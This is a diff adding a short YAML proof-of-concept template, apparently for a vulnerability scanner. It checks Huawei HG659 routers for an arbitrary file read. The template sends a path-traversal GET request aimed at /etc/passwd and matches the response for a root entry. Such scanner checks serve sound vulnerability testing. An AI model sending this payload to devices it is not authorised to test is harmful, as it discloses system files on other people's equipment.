@@ -1,0 +1,16 @@
+name: yaml-poc-huawei-hg659-readfile-CT-194257
+binding: ebe6cd4d-046d-4165-a3f2-26678f517b6f
+detail:
+    author: system_user
+    vulnerability:
+        id: 2b6e4804-d681-47e9-9091-a4f5e2380136
+        level: medium
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /lib///....//....//....//....//....//....//....//....//etc//passwd
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: r0()
